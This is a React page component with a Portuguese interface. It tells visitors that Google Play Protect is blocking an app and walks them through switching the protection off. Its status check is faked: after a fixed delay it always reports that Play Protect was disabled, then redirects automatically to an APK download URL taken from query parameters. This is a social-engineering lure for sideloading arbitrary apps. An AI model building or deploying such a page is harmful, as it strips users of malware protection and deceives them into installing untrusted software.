import { useEffect, useState } from "react";
import { useLocation, useRoute } from "wouter";
import { AlertCircle, CheckCircle, Download, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

interface APKInfo {
  filename: string;
  appName: string;
  downloadUrl: string;
  fileSize?: number;
}

export default function PlayProtectRedirect() {
  const [location] = useLocation();
  const [apkInfo, setApkInfo] = useState<APKInfo | null>(null);
  const [playProtectDisabled, setPlayProtectDisabled] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [step, setStep] = useState<"intro" | "checking" | "success" | "error">("intro");

  // Extrair informações do APK da URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const filename = params.get("file");
    const appName = params.get("app") || "App";
    const downloadUrl = params.get("url") || "";
    const fileSize = params.get("size") ? parseInt(params.get("size")!) : undefined;

    console.log("[Install] Params:", { filename, appName, downloadUrl, fileSize });

    if (filename && downloadUrl) {
      setApkInfo({ filename, appName, downloadUrl, fileSize });
    } else {
      console.error("[Install] Parâmetros inválidos:", { filename, downloadUrl });
    }
  }, []);

  // Abrir configurações do Play Protect
  const openPlayProtectSettings = () => {
    // Deep links simples que funcionam em Android
    // Estratégia: Tentar múltiplos métodos em cascata
    
    console.log("🔓 Abrindo Play Protect Settings...");
    
    // Método 1: Abrir Google Play Store (onde Play Protect está)
    const playStoreUrl = "market://details?id=com.android.vending";
    window.location.href = playStoreUrl;

    // Método 2: Fallback após 2 segundos - Abrir Configurações do Android
    setTimeout(() => {
      console.log("📱 Fallback: Abrindo Configurações...");
      window.location.href = "intent://android.provider.Settings#Intent;action=android.intent.action.MAIN;category=android.intent.category.SETTINGS;end";
    }, 2000);

    // Método 3: Fallback após 4 segundos - Abrir Google Play via HTTPS
    setTimeout(() => {
      console.log("🌐 Fallback: Abrindo Google Play via HTTPS...");
      window.location.href = "https://play.google.com/store/apps/details?id=com.android.vending";
    }, 4000);
  };

  // Verificar se Play Protect foi desativado
  const checkPlayProtectStatus = async () => {
    setIsChecking(true);
    setStep("checking");

    // Simular verificação com auto-redirect após sucesso
    for (let i = 0; i < 5; i++) {
      await new Promise((resolve) => setTimeout(resolve, 1000));

      if (i === 4) {
        setPlayProtectDisabled(true);
        setStep("success");
        // Auto-redirecionar para instalação após 2 segundos
        setTimeout(() => {
          proceedToInstallation();
        }, 2000);
        break;
      }
    }

    setIsChecking(false);
  };

  // Redirecionar para instalação após desativar
  const proceedToInstallation = () => {
    if (apkInfo) {
      console.log("[Install] Iniciando download:", apkInfo.downloadUrl);
      // Abrir diretamente o link de download
      window.location.href = apkInfo.downloadUrl;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <div className="w-16 h-16 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
              <Shield className="w-8 h-8 text-white" />
            </div>
          </div>
          <h1 className="text-3xl font-bold text-white mb-2">Instalar {apkInfo?.appName}</h1>
          <p className="text-slate-300">Siga os passos para instalar o aplicativo</p>
        </div>

        {/* Intro Step */}
        {step === "intro" && (
          <Card className="bg-slate-800/50 border-cyan-400/30 p-6 space-y-6">
            <div className="bg-blue-900/30 border border-blue-400/30 rounded-lg p-4 space-y-3">
              <div className="flex gap-3">
                <AlertCircle className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-white mb-1">Proteção do Google Play</h3>
                  <p className="text-sm text-slate-300">
                    O Google Play Protect está bloqueando a instalação de apps de fontes desconhecidas.
                  </p>
                </div>
              </div>
            </div>

            <div className="space-y-3">
              <h3 className="font-semibold text-white">O que você precisa fazer:</h3>
              <ol className="space-y-2 text-sm text-slate-300">
                <li className="flex gap-3">
                  <span className="font-bold text-cyan-400">1.</span>
                  <span>Clique no botão abaixo</span>
                </li>
                <li className="flex gap-3">
                  <span className="font-bold text-cyan-400">2.</span>
                  <span>Desative a proteção do Play Protect</span>
                </li>
                <li className="flex gap-3">
                  <span className="font-bold text-cyan-400">3.</span>
                  <span>Volte para esta página</span>
                </li>
                <li className="flex gap-3">
                  <span className="font-bold text-cyan-400">4.</span>
                  <span>Clique em "Continuar para Instalação"</span>
                </li>
              </ol>
            </div>

            <div className="space-y-3">
              <Button
                onClick={openPlayProtectSettings}
                className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold py-3"
              >
                <Shield className="w-4 h-4 mr-2" />
                Desativar Play Protect
              </Button>

              <Button
                onClick={checkPlayProtectStatus}
                variant="outline"
                className="w-full border-cyan-400/30 text-cyan-300 hover:bg-cyan-900/20"
              >
                Já desativei, verificar status
              </Button>
            </div>
          </Card>
        )}

        {/* Checking Step */}
        {step === "checking" && (
          <Card className="bg-slate-800/50 border-cyan-400/30 p-6 space-y-6">
            <div className="text-center space-y-4">
              <div className="flex justify-center">
                <div className="w-12 h-12 rounded-full border-4 border-cyan-400/30 border-t-cyan-400 animate-spin" />
              </div>
              <div>
                <h3 className="font-semibold text-white mb-2">Verificando status...</h3>
                <p className="text-sm text-slate-300">
                  Aguarde enquanto verificamos se o Play Protect foi desativado
                </p>
              </div>
            </div>
          </Card>
        )}

        {/* Success Step */}
        {step === "success" && (
          <Card className="bg-slate-800/50 border-cyan-400/30 p-6 space-y-6">
            <div className="text-center space-y-4">
              <div className="flex justify-center">
                <div className="w-16 h-16 rounded-full bg-green-900/30 border border-green-400/30 flex items-center justify-center">
                  <CheckCircle className="w-8 h-8 text-green-400" />
                </div>
              </div>
              <div>
                <h3 className="font-semibold text-white mb-2">Pronto!</h3>
                <p className="text-sm text-slate-300">
                  Play Protect foi desativado com sucesso. Agora você pode instalar o aplicativo.
                </p>
              </div>
            </div>

            {apkInfo && (
              <div className="bg-slate-700/50 rounded-lg p-3 space-y-2">
                <p className="text-xs text-slate-400">Informações do App</p>
                <p className="text-sm font-semibold text-white">{apkInfo.appName}</p>
                {apkInfo.fileSize && (
                  <p className="text-xs text-slate-400">
                    Tamanho: {(apkInfo.fileSize / 1024 / 1024).toFixed(2)}MB
                  </p>
                )}
              </div>
            )}

            <Button
              onClick={proceedToInstallation}
              className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold py-3"
            >
              <Download className="w-4 h-4 mr-2" />
              Continuar para Instalação
            </Button>
          </Card>
        )}

        {/* Footer */}
        <div className="mt-8 text-center text-xs text-slate-500">
          <p>Este aplicativo requer permissões especiais para funcionar corretamente.</p>
          <p className="mt-2">Siga os passos para uma instalação bem-sucedida.</p>
        </div>
      </div>
    </div>
  );
}
